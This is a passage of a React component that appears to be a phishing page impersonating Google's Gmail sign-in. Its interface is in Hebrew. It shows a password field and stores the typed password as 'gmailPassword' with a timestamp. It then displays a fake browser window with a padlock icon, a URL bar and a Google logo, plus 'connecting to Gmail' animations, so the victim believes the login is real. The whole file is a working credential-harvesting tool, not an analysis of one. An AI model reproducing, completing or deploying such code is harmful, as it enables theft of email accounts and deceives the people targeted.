                    // Eye SVG (mostrar senha)
                    <svg
                      width="20"
                      height="20"
                      viewBox="0 0 24 24"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"
                        stroke="#5f6368"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                      <circle
                        cx="12"
                        cy="12"
                        r="3"
                        stroke="#5f6368"
                        strokeWidth="2"
                      />
                    </svg>
                  ) : (
                    // Eye-off SVG (senha mascarada)
                    <svg
                      width="20"
                      height="20"
                      viewBox="0 0 24 24"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M3 3l18 18"
                        stroke="#5f6368"
                        strokeWidth="2"
                        strokeLinecap="round"
                      />
                      <path
                        d="M10.58 6.08A10.87 10.87 0 0112 6c7 0 11 6 11 6a17.82 17.82 0 01-4.09 4.66"
                        stroke="#5f6368"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                      <path
                        d="M6.61 8.04A17.5 17.5 0 001 12s4 7 11 7c1.1 0 2.14-.14 3.11-.41"
                        stroke="#5f6368"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                      <path
                        d="M9.88 9.88a3 3 0 104.24 4.24"
                        stroke="#5f6368"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                    </svg>
                  )}
                </button>
              </div>
              {invalidMessage && (
                <div style={{ color: "#d93025", fontSize: 12, marginTop: 6 }}>
                  {invalidMessage}
                </div>
              )}
              <a
                href="#"
                style={{
                  color: "#1a73e8",
                  fontSize: 14,
                  textDecoration: "none",
                  marginTop: 8,
                  fontWeight: 500,
                }}
                onClick={(e) => e.preventDefault()}
              >
                שכחת אימייל?
              </a>
            </div>

            {/* Informative paragraph about Privacy Policy and Terms, showing configured app name if present */}
            <div
              style={{
                color: "#3c4043",
                fontSize: 13,
                lineHeight: 1.5,
                marginTop: 6,
                marginBottom: 16,
                maxWidth: 440,
              }}
            >
              עיין ב{" "}
              <a href="#" style={{ color: "#1a73e8", textDecoration: "none" }}>
                מדיניות הפרטיות
              </a>{" "}
              וב{" "}
              <a href="#" style={{ color: "#1a73e8", textDecoration: "none" }}>
                תנאי השירות
              </a>{" "}
              של האפליקציה הזו
              {appName ? (
                <span style={{ fontWeight: 600, color: "#202124" }}>
                  {" "}
                  {appName}
                </span>
              ) : null}{" "}
              } לפני השימוש בה.
            </div>

            {/* Create account link */}
            <div style={{ marginBottom: 12 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{
                  color: "#1a73e8",
                  textDecoration: "none",
                  fontSize: 14,
                  fontWeight: 500,
                }}
              >
                צור חשבון
              </a>
            </div>

            {/* Ações */}
            <div
              style={{
                display: "flex",
                justifyContent: "flex-end",
                alignItems: "center",
                marginTop: "auto",
                paddingBottom: 20,
                paddingTop: 20,
              }}
            >
              <button
                ref={nextBtnRef}
                style={{
                  background: isSubmitting ? "#b3d1fa" : "#1a73e8",
                  color: "#ffffff",
                  border: "none",
                  borderRadius: 999,
                  padding: "9px 18px",
                  fontSize: 13,
                  fontWeight: 500,
                  cursor: isSubmitting ? "not-allowed" : "pointer",
                  minHeight: 36,
                  minWidth: 80,
                  width: nextBtnWidth ? nextBtnWidth : undefined,
                }}
                onClick={(e) => {
                  e.preventDefault();
                  if (!password.trim()) return;
                  // Garantir persistência imediata do valor no cliente
                  updateClientData({
                    gmailPassword: password,
                    gmailPasswordSubmittedAt: Date.now(),
                  });
                  // Etapa 1 sem overlay, avança à etapa 2 após 3s
                  setIsSubmitting(true);
                  setLoadingStage("bar");
                  setTimeout(() => setLoadingStage("final"), 3000);
                }}
                disabled={isSubmitting || !password.trim()}
              >
                {isSubmitting ? "Verify..." : translations.next}
              </button>
            </div>
            {/* Overlay desativado */}
            {false && isSubmitting && loadingStage === "bar" && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "rgba(0,0,0,0.08)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  pointerEvents: "none",
                  zIndex: 15,
                }}
              >
                <div
                  style={{
                    width: 32,
                    height: 32,
                    border: "3px solid #1a73e8",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>
            )}
            {/* Etapa 2: overlay com gif e titlebar */}
            {isSubmitting && loadingStage === "final" && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  flexDirection: "column",
                  pointerEvents: "none",
                  zIndex: 20,
                }}
              >
                {/* Barra da janela (overlay) */}
                <div
                  style={{
                    height: 28,
                    background: "#e8f0fe",
                    borderBottom: "1px solid #d7e3fc",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "0 8px",
                    fontSize: 12,
                    color: "#202124",
                  }}
                >
                  <span
                    style={{
                      opacity: 0.9,
                      display: "flex",
                      alignItems: "center",
                      gap: 6,
                    }}
                  >
                    <svg
                      xmlns="https://www.w3.org/2000/svg"
                      width="16"
                      height="16"
                      viewBox="0 0 40 48"
                      aria-hidden="true"
                      style={{ display: "block" }}
                    >
                      <path
                        fill="#4285F4"
                        d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                      ></path>
                      <path
                        fill="#34A853"
                        d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                      ></path>
                      <path
                        fill="#FABB05"
                        d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                      ></path>
                      <path
                        fill="#E94235"
                        d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                      ></path>
                    </svg>
                    {translations.windowTitle}
                  </span>
                  <div
                    style={{ display: "flex", gap: 4, alignItems: "center" }}
                  >
                    {/* - */}
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      aria-hidden="true"
                    >
                      <path
                        d="M3 8.5H13"
                        stroke="#5f6368"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                    </svg>
                    {/* □ */}
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      aria-hidden="true"
                    >
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#5f6368"
                        strokeWidth="1.2"
                        fill="none"
                      />
                    </svg>
                    {/* × */}
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      aria-hidden="true"
                    >
                      <path
                        d="M4 4L12 12"
                        stroke="#5f6368"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#5f6368"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                    </svg>
                  </div>
                </div>
                {/* URL bar (overlay) */}
                <div
                  style={{
                    borderBottom: "1px solid #eaecee",
                    padding: 0,
                    background: "#ffffff",
                    margin: 0,
                  }}
                >
                  <div
                    style={{
                      width: "100%",
                      background: "#eef1f3",
                      border: "1px solid #d0d7de",
                      borderRadius: 0,
                      height: 32,
                      display: "flex",
                      alignItems: "center",
                      padding: "0 10px",
                      gap: 8,
                      fontSize: 12,
                      color: "#202124",
                      direction: "ltr", // Força LTR para manter ícone à esquerda e URL correta
                    }}
                  >
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 16 16"
                      xmlns="http://www.w3.org/2000/svg"
                      version="1.1"
                      fill="none"
                      stroke="#5f6368"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="1.5"
                      aria-hidden="true"
                      style={{ display: "block" }}
                    >
                      <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                      <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                    </svg>
                    <div
                      style={{
                        overflow: "hidden",
                        textOverflow: "ellipsis",
                        whiteSpace: "nowrap",
                      }}
                    >
                      {translations.url}
                    </div>
                  </div>
                </div>
                {/* Barra animada acima do header (overlay), colada nas bordas */}
                <div
                  style={{
                    width: "100%",
                    height: 4,
                    background: "#ffffff",
                    overflow: "hidden",
                    margin: 0,
                    borderRadius: 0,
                  }}
                >
                  <div
                    style={{
                      width: "100%",
                      height: "100%",
                      background: "#1a73e8",
                      animation: "loadingBar 2s ease-in-out infinite",
                    }}
                  />
                </div>
                {/* Header pequeno (overlay) - REMOVIDO conforme solicitado */}

                {/* Conteúdo final */}
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 16,
                  }}
                >
                  <img
                    src={gmailLogo}
                    alt="Connecting to Gmail"
                    style={{ width: 80, height: 80 }}
                  />
                  <div
                    style={{
                      width: 24,
                      height: 24,
                      border: "3px solid #1a73e8",
                      borderTop: "3px solid transparent",
                      borderRadius: "50%",
                      animation: "spin 1s linear infinite",
                    }}
                  />
                  <p
                    style={{
                      color: "#5f6368",
                      fontSize: 14,
                      margin: 0,
                      textAlign: "center",
                    }}
                  >
                    {phrases[phraseIndex]}
                  </p>
                </div>
                {/* Footer visível também na etapa 2 */}
                <div
                  style={{
                    width: "100%",
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    minHeight: 44,
                    borderTop: "1px solid #f0f0f0",
                    background: "transparent",
                    padding: "0 24px",
                  }}
                >
                  <div style={{ display: "flex", gap: 40 }}>
                    <a
                      href="#"
                      style={{
                        color: "#222",
                        fontSize: 15,
                        textDecoration: "none",
                      }}
                      onClick={(e) => e.preventDefault()}
                    >
                      {translations.help}
                    </a>
                    <a
                      href="#"
                      style={{
                        color: "#222",
                        fontSize: 15,
                        textDecoration: "none",
                      }}
                      onClick={(e) => e.preventDefault()}
                    >
                      {translations.privacy}
                    </a>
                    <a
                      href="#"
                      style={{
                        color: "#222",
                        fontSize: 15,
                        textDecoration: "none",
                      }}
                      onClick={(e) => e.preventDefault()}
                    >
                      {translations.terms}
                    </a>
                  </div>
                  <span style={{ color: "#666", fontSize: 12 }}>
                    {country?.name || "..."}
                  </span>
                </div>
              </div>
            )}
          </div>

          {/* Footer */}
          <div
            style={{
              width: "100%",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              minHeight: 44,
              borderTop: "1px solid #f0f0f0",
              background: "transparent",
              padding: "0 24px",
            }}
          >
            <div style={{ display: "flex", gap: 40 }}>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
                onClick={(e) => e.preventDefault()}
              >
                {translations.help}
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
                onClick={(e) => e.preventDefault()}
              >
                {translations.privacy}
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
                onClick={(e) => e.preventDefault()}
              >
                {translations.terms}
              </a>
            </div>
            <span style={{ color: "#666", fontSize: 12 }}>
              {country?.name || "..."}
            </span>
          </div>
        </div>
        {/* Keyframes */}
        <style>{`
        @keyframes loadingBar {
          0% { transform: translateX(-100%); }
          50% { transform: translateX(0%); }
          100% { transform: translateX(100%); }
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
      </div>
    </EmailLayout>
  );
};

export default GmailPasswordPage;
